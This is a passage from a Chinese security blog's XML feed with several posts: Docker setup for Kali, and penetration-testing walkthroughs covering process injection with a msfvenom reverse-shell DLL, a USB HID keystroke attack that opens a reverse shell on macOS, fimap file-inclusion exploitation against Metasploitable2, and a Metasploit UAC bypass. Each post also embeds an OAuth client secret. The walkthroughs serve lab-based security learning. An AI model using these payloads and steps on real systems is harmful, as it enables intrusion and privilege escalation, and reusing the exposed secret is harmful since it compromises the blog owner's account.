3.我们可以使用几个国内的docker镜像加速器 阿里云加速器&amp;DaoCloud 加速器！！！！！&nbsp;如果你使用的docker是docker for windows 、或者docker for mac 的话 推荐可使用‘DaoCloud 加速器’ https://www.daocloud.io/mirror#accelerator-doc &nbsp;一、在‘DaoCloud 加速器’ 注册登录后 进行复制镜像地址，到docker下进行设置。&nbsp; 二、右键点击桌面顶栏的 docker 图标，选择 Preferences，找到Daemon，在registy mirrors 中添加，并应用重启docker（apply&amp;restart）&nbsp; 4.如果你是linux 或者docker tools box 的话 可以选择阿里云加速器–docker镜像仓库。&nbsp;https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator &nbsp;查看阿里云加速器操作文档，以及docker的版本，进行对应操作。&nbsp;&nbsp;配置完之后，镜像开启加速下载如下图；&nbsp; 5.创建并连接容器、端口映射、绑定随机id&nbsp; docker run -i -t –name kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalilinux/kali-linux-docker /bin/bash &nbsp;&nbsp;命令详解：一、run命令简单使用docker run -i -t //创建并连接容器， run命令参数使用 -i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用&nbsp;在这里我们使用docker ps -a 查看docker容器运行、创建的历史记录，可以发现你每次创建一个容器的时候都会生成一个随机id、容器名称，在81324e6f0059我们可以看到，这是我们之前生成的，也是指定了容器的名称，将ID、名称附着在容器上。docker ps -a二、Docker 会为我们创建每一个容器自动生成一个随机ID、名称，如果想为容器指定一个名称，而不是使用自动生成的，则可以使用–name 来使用&nbsp;如：–name kali //指定容器名称为kali三、容器端口映射docker指令：docker run -p ip:hostPort:containerPort redis&nbsp;使用-p参数会分配宿主机的端口映射到虚拟机。IP表示主机的IP地址。hostPort表示宿主机的端口。containerPort表示虚拟机的端口。以下为端口映射实例图片对比：我们也可以采用 指定容器端口映射本机随机端口,防止本机端口占用等情况。格式为-p &lt;空&gt;:容器需映射端口可指定物理机的随机端口 映射容器端口 docker run -i -t -v /Users/demon:/root -p :4444 -p :5555 -p :22 kali /bin/bash&nbsp;端口被占用&nbsp;指定随机端口为空。&nbsp;映射为随机端口&nbsp;四、使用-v 参数实现目录共享挂载，docker可以支持把一个宿主机上的目录挂载到镜像里。通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径。现在镜像内就可以共享宿主机里的文件了。然而我这边不打算采用目录共享，可用ssh的特性进行文件传输上传下载等功能docker run -i -t -v /Users/demon:/root -p :4444 -p :5555 -p :22 kali /bin/bash&nbsp;6.查看列举本地镜像。&nbsp;docker images&nbsp;7.开启容器&nbsp;start命令docker start 容器ID or 容器名称&nbsp;docker start e8d612658eb0&nbsp;容器名称可指容器随机生成的名称亦可是–name 指定过的名称 如之前指定的是kali 这里就可以使用 docker start kali8.连接容器&nbsp;attach 命令docker attach 是Docker自带的命令。下面示例如何使用该命令。但是使用 attach 命令有时候并不方便。当多个窗口同时 attach 到同一个容器的时候，所有窗口都会同步显示。当某个窗口因命令阻塞时,其他窗口也无法执行操作了。&nbsp;同样docker attach 可以接上容器名称or 容器ID&nbsp;&nbsp;使用attach 窗口占用解决方案 &nbsp; 1.使用kimtematic GUI管理工具 点击exec。&nbsp;2.使用命令行 exec命令&nbsp;&nbsp;docker exec -it kali /bin/bash&nbsp;&nbsp;&nbsp;9.停止容器&nbsp;在容器内使用exit即停止容器&nbsp;或在容器外使用stop命令即停止容器&nbsp;10.删除容器&nbsp;rm命令使用rm命令之前必须停止该运行的容器。docker rm 容器id or 容器名称&nbsp;11.批量删除停止容器&nbsp;docekr ps -a -q 查看容器停止或者正在运行的容器iddocker rm 之前也说到过 是删除容器的意思，但是docker rm 本身默认的是不会删除正在运行的容器。如此一来 docker rm $(docker ps -a -q) 的意思就是 批量删除停止的容器。12.删除本地镜像 docker rmi 镜像名or 镜像ID 删除之前需停止容器并删除和该镜像关联的容器&nbsp;&nbsp;13.将容器做备份快照迁移。Docker是基于镜像的。镜像类似于已经包含了文件、配置和安装好的程序的虚拟机镜像。同样的，你可以像启动虚拟机一样启动多个镜像实例。运行中的镜像称为容器。你可以修改容器（比如删除一个文件），但这些修改不会影响到镜像。不过，你使用docker commit 命令可以把一个正在运行的容器变成一个新的镜像。&nbsp;docker save : 将指定镜像保存成 tar 归档文件。&nbsp;Export命令用于持久化容器（不是镜像）。&nbsp;以上同样都是导出，但是区别在于save 是导出镜像而不是导出容器，export是导出容器，历史记录但不能历史层回滚。反而使用export命令导出保存快照，你将无法回滚到之前的层(layer)。以下是使用导入save的镜像以及export的镜像，导入镜像的大小。&nbsp;&nbsp;docker load -i kali.tar &nbsp;&nbsp;docker import kali.tar kali&nbsp;&nbsp;&nbsp;14 .docker 资源占用之内存docker stats可以观察到此时的资源使用情况是固定不变的 docker stats&nbsp;使用-m 参数可指定内容（m、g）使用docker -m操作会使内存被限制为输入大小的两倍，内存上限为400m&nbsp;可使用内存压力测试工具：stress，对内存进行测试。若运行后在几秒内被杀死说明内存被限制为400M&nbsp;&nbsp;15.尝试写一份简单的Dockerfile&nbsp;FROM kalilinux/kali-linux-docker# 拉取官方kali镜像MAINTAINER Demon#注明作者RUN apt-get update &amp;&amp; apt-get install -y \ sqlmap \ ssh \ –no-install-recommends &amp;&amp; rm -rf /var/cache/apt/archives/*.deb#使run 命令 执行 要安装的软件如安装ssh 、sqlmap 以及清理缓存ADD sshd_config /etc/ssh/#添加本地文件到容器的/etc/ssh/sshd_config 进行替换。 dockerfile实现了自动拉去镜像、构建镜像、自动更新源、下载安装sqlmap、配置ssh等动作。&nbsp;docker build -t kalil . //编写完成 Dockerfile 后可以使用docker build来生成镜像。&nbsp;&nbsp; &nbsp;创建并连接容器 docker run -i -t –name=kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalil /bin/bash.实现sqlmap ssh等配置&nbsp;实现已配置ssh 下载链接：https://github.com/boot2docker/boot2docker/releaseshttps://www.docker.com dockerhttps://www.docker.com/docker-windows docker for windowshttps://www.docker.com/docker-mac docker for machttps://www.docker.com/products/docker-toolbox docker tools box参考资料：https://my.oschina.net/aixiaohua/blog/651171 Windows环境下手动更新boot2docker.isohttp://www.cnblogs.com/franson-2016/p/6412971.html 解决非root用户使用docker的办法https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html docker入门实践亦可参考 我的好基友国光：http://www.sqlsec.com/2017/docker.html docker入门简明。http://www.tuicool.com/articles/EBNZBjJ 安全相关Docker Image收集https://my.oschina.net/zjzhai/blog/225112 Docker的save和export命令的区别http://blog.csdn.net/u010472499/article/details/52994454 Docker 资源限制之内存http://www.jb51.net/article/103483.htm Docker容器内存限制的方法http://os.51cto.com/art/201507/485007.htm Dockerfile命令介绍及实例 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shellter]]></title>
    <url>%2Fshellter.html</url>
    <content type="text"><![CDATA[ShellterShellter是一个动态的shellcode注入工具，是第一个真正动态的PE infector创建的。它可以用于将shellcode注入本机Windows应用程序（目前仅适用于32位应用程序）。shellcode可以是您或您通过框架生成的东西，如Metasploit。 Shellter利用PE文件的原始结构，并不适用任何修改，如更改部分内存访问权限（除非用户想要的），添加额外的部分具有RWE访问权限，以及在AV扫描中看起来很诡异的任何内容。 Shellter采用基于目标应用程序的执行流程的独特动态方法，这只是冰山一角。Shellter不仅仅是一个EPO感染者，试图找到一个位置来插入指令来重定向执行到有效载荷。与任何其他感染者不同，Shellter的高级感染引擎从不将执行流程传输到受感染的PE文件中的代码洞穴或添加的部分。 视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/shellter.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); https://www.shellterproject.com/introducing-shellter/https://www.youtube.com/watch?v=5foouybCEk0 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[InjectProc&Metasploit]]></title>
    <url>%2FInjectProc.html</url>
    <content type="text"><![CDATA[视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/InjectProc.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); InjectProc流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。 有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。 大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。&nbsp; DLL注入：打开目标进程。分配空间将代码写入远程进程。执行远程代码。&nbsp;具体可以看看github内容介绍。&nbsp;&nbsp;我看了大牛的视频自己学着模仿了一下使用的InjectProc.exe在cmd运行&nbsp;这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。首先我使用的是—— InjectProc.exe dll_inj path/to/dll.dll notepad.exe&nbsp;首先下载到我的桌面，https://github.com/secrary/InjectProc ，和下载InjectProc.exe，是那位大牛制作完成的。&nbsp;&nbsp;&nbsp; 0x01首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。&nbsp;&nbsp;我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程InjectProc.exe dll_inj path/to/dll.dll notepad.exe。在这里我们使用InjectProc\test_files目录中的，并且我们随机打开一个进程如记事本进程。使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况&nbsp;&nbsp; 0x02那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。首先我们使用msfvenom 生成dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll&nbsp;&nbsp;以及打开我们的msf开启监听&nbsp;那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中&nbsp;使用以下命令,并且打开记事本。&nbsp;&nbsp;得到最终会话&nbsp;&nbsp;&nbsp;视频资料：https://www.youtube.com/watch?v=GT9nBuXatmU InjectProc | Process Injection Techniques | Malwarehttps://www.pinterest.com/penetrationtesting/https://github.com/secrary/InjectProc github var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑手第三篇----DuckHunterHID for mac]]></title>
    <url>%2FDuckHunterHID.html</url>
    <content type="text"><![CDATA[继上一篇nethunter 的HID键盘攻击之后，我打算在我的mac上进行HID攻击，（http://www.ggsec.cn/nethuner-HID.html ） 这次使用到的是USB-DuckHunter-HID，下面请看背景知识回顾—————–》&nbsp; 0x00 HID 键盘攻击在这个视频键盘HID攻击被证明。它可以在几秒钟内通过USB将目标解锁机器。它通过模拟键盘和鼠标，盲目地键入受控命令，轻击鼠标指针并使鼠标点击武器。这是什么？几乎每台包括台式机，笔记本电脑，平板电脑和智能手机的电脑都通过键盘输入人类。这就是为什么有一个称为HID或人机接口设备的无处不在的USB标准的规范。简单地说，声称是Keyboard HID的任何USB设备将被大多数现代操作系统自动检测和接受。无论是Windows，Mac，Linux还是Android设备，键盘都是King。 通过利用这种固有的信任，脚本敲击的速度超过每分钟1000字，传统的对策可以被这个不知疲倦的骑兵绕过 - USB攻击。&nbsp;&nbsp; DuckHunter HIDDuckHunter HID选项允许您快速方便地将USB Rubber Ducky脚本转换为NetHunter HID攻击格式。您可以从示例预设菜单中选择一个选项，或从Duck Toolkit站点中选择更多选择的预配置脚本。进攻安全人员再次出现。受欢迎的Pentesting发行版Kali Linux的构建者为Android设备推出了一款名为Kali NetHunter的新工具。该工具是一种移动分销，旨在在Android手机上安装并运行时通过USB危及系统。 该工具可以通过HID风格的攻击伪装成键盘，发出命令以打开其他攻击中的管理外壳，包括BadUSB中间人风格的攻击。该工具的图片目前可用于Nexus设备，但其他Android设备的构建可能正在进行中。&nbsp; &nbsp;&nbsp; 0x01 首先我们来看下，黑手（kali_nethunter）的duck_HID 给我们提供了哪些默认的脚本。 首先呢 我们可以看到在nethunter客户端上可以看到有（DuckHunter HID ）字样，其实他就是模拟黄鸭，USB Rubber Ducky脚本转换为NetHunter HID攻击格式。&nbsp;&nbsp;&nbsp;&nbsp;在默认的选项我们可以看到他给我们提供了默认的几个选项，其中有两个脚本呢 是针对Mac OSX 的HID攻击，攻击后呢返回一个shell连接，这里其中有perl和Ruby两个脚本，我们就选择其中一个选择ruby。&nbsp;&nbsp;0x02选择ruby脚本。我们来简单的看下代码的意思&nbsp;&nbsp;0X031.COMMAND SPACE—–在mac的快捷键表示为搜索框搜索&nbsp;2.STRING terminal ENTER——–输入字符串terminal 搜索终端，并按下回车&nbsp;3.Command+n就是新建的快捷键，功能是新建一个项目，在不同程序有不同的新建项目种类。&nbsp;4.在终端下输入字符串使用ruby socket建立服务端&nbsp;5.当然了在这段代码也我们提示了 使用netcat（nc ）建立监听 并返回会话，他这里0.0.0.0提示我们更改我们黑手nethunter的ip地址。如：查看黑手使用的ip&nbsp;&nbsp;更改ip&nbsp;&nbsp;保存脚本&nbsp;&nbsp;0X041.并且在终端中使用nc命令建立监听 ———nc -vv -l -p 1337 &nbsp;&nbsp;2 .点击三角按钮，执行攻击。 &nbsp;&nbsp;3.返回shell连接&nbsp;&nbsp;&nbsp;&nbsp;最终结果：&nbsp;&nbsp;更多项目可在github–USBDucky 项目中寻找你需要的PAYLOAD。https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads&nbsp;&nbsp; 视频演示可观看个人演示的视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/DuckHunterHID.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fimap_Metasploitable2漏洞攻击]]></title>
    <url>%2Ffimap_metasploitable2%20.html</url>
    <content type="text"><![CDATA[简介Fimap是一款本地及远程的文件包含漏洞检测工具，并能对检测到的漏洞进行利用，带了一个google的语法搜索功能，这款工具只针对文件包含漏洞的检测及利用.&nbsp;&nbsp;本次使用到的环境：docker_kali 攻击者 metasploitable2 靶机环境&nbsp; kali中自带的工具:fimap&lt;p&gt; -H，--harvest 模式为新URL收集URL。 需要一个根网址（-u）开始在那里爬网。 还需要（-w）为质量模式编写URL列表 &amp;nbsp; -d，--depth = CRAWLDEPTH 您希望在收获模式（-H）下爬网目标网站的CRAWLDEPTH（递归级别）。默认值为1. &amp;nbsp; -x，--exploit 启动一个交互式会话，您可以在其中, 选择一个目标并执行某些操作 &amp;nbsp; -C，--enable-color --force-run忽略实例检查，只要运行fimap。&lt;/p&gt; &amp;nbsp; 例子： 1. 简单扫描 ./fimap.py -u &apos;http://localhost/test.php?file=bang&amp;id=23&apos; 2. 使用列表进行扫描 ./fimap.py -m -l &apos;/tmp/urllist.txt&apos; 3. 使用谷歌语法搜索 ./fimap.py -g -q &apos;inurl:include.php&apos; 4. 收集递归等级为3和的网页的所有链接 将URL写入 /tmp/urllist ./fimap.py -H -u &apos;http://localhost&apos; -d 3 -w /tmp/urllist 参考资料：http://tools.kali.org/web-applications/fimap 视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/fimap_metasploitasble2.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;1.本次使用到的是metaspolitable2 靶机环境 ，我们打开浏览器输入该靶机的 ip&nbsp;&nbsp;&nbsp;&nbsp;2.使用fimap的例子4 进行尝试检测 ： fimap -H -u http://localhost -d 3 -w /tmp/urllist &nbsp; &nbsp; 3.在上图中可以看到，对dvwa/dav/twiki/等进行扫描，图中对Mutillidae扫描的列表比较多。 mutillidae是一个免费，开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。它是由Adrian “Irongeek” Crenshaw和Jeremy “webpwnized” Druin.开发的一款自由和开放源码的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等.对检测到的漏洞进行攻击，并忽略实例检查： fimap -x –force-run &nbsp; &nbsp; 4.填写目标序列号1 。进入漏洞url列表，选择漏洞id 如选择1。 &nbsp; &nbsp;5、执行攻击 选择攻击模式。如选择1 &nbsp; &nbsp; 使用fimap 反弹shell 得到回话、 &nbsp; &nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metaspolit_bypassuac_win10]]></title>
    <url>%2Fbypassuac-win10.html</url>
    <content type="text"><![CDATA[视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/win10_bypassUAC.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;当你得一个meterpreter会话，却提不了权怎么办？？Demon：嘚吧嘚————此方法只能绕过本机防护机制，但是绕不过360等。以及此模块需更新最新版即可&nbsp; 第一步：搜索 bypassuac msf exploit(web_delivery) &gt; search bypassuac &nbsp; &nbsp; &nbsp; 第二步: 使用提权模块，进行对windows uac绕过。 msf exploit(web_delivery) &gt; use exploit/windows/local/bypassuac_eventvwr &nbsp; &nbsp; &nbsp;/// 查看模块选项 msf exploit(bypassuac_eventvwr) &gt; options Module options (exploit/windows/local/bypassuac_eventvwr): Name Current Setting Required Description SESSION yes The session to run this module on. Exploit target: Id Name 0 Windows x86/////////////&nbsp;&nbsp;&nbsp; 第三步： 设置回话 （比如说我这里的话说是1）那就设置1 msf exploit(bypassuac_eventvwr) &gt; set SESSION 1 SESSION =&gt; 1 &nbsp; &nbsp; &nbsp; 第四步： 执行exploit，执行提权。 msf exploit(bypassuac_eventvwr) &gt; exploit &nbsp;&nbsp;&nbsp; 第五步 ：查看会话，在这里你可以发现有2个回话。 msf exploit(bypassuac_eventvwr) &gt; sessions &nbsp;&nbsp;&nbsp; 第六步：进入会话2。进入meterpreter会话，进行进一步的提权操作.以及下面是提权前普通用户和 提权后system 最高权限对比！ &nbsp;&nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container') 视频中相关代码可复制代码可直接复制！！！ 代码可直接复制！！！ 代码可直接复制！！！ 代码可直接复制！！！！ &nbsp;]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新增提问板块]]></title>
    <url>%2FDiscuss1.html</url>
    <content type="text"><![CDATA[&nbsp; 这次新开了一个目的也是一个 增加一个留言板块，增进探讨和提问解决 与更多人参与讨论，方便一起解决,有什么问题可以交个我来进行生成md文档 ，上传本次问题，与更多朋友参与一起讨论探讨，方便解决问题！！ Demon 2017.9.12 &nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>提问板块</category>
      </categories>
      <tags>
        <tag>提问板块</tag>
      </tags>
  </entry>
</search>
